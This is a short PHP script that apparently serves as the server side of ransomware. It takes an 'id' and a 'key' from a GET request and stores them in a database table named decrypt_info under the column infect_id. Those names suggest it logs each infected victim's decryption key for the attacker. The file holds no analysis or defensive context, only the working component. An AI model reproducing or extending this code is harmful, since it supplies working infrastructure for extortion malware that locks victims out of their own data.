<?php 

    require("config.php");

    try{
        $con = mysqli_connect($serverName, $dbUsername, $dbPassword, $dbName);
    } catch (Exception $e){
        echo "<center><font color='red'>Connection failed, please check your internet connection. If our servers are down, please wait until we recover them.</font></center>";
        exit();
    }

    if (isset($_GET['key'])){
        $id = $_GET['id'];
        $key = $_GET['key'];
        
        $insert_query = "INSERT INTO decrypt_info (infect_id, `key`) values(?, ?)";

        $stmt = $con -> prepare($insert_query);
        $stmt -> bind_param("ss", $id, $key);
        $stmt -> execute();

        echo "<center><font color='green'>Successfully submited</font></center>";
        
    }

?>